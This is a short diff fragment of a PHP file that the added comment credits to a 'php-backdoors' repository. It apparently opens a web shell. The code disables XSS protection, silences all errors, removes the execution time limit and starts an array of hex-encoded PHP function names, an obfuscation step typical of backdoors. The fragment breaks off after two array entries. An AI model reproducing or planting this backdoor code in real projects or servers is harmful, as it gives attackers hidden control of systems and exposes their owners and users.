@@ -1,4 +1,6 @@
-<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE); 
+<?php
+// from https://github.com/1337r0j4n/php-backdoors
+header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE); 
 $Array = [
 		'7068705f756e616d65',
 		'70687076657273696f6e',
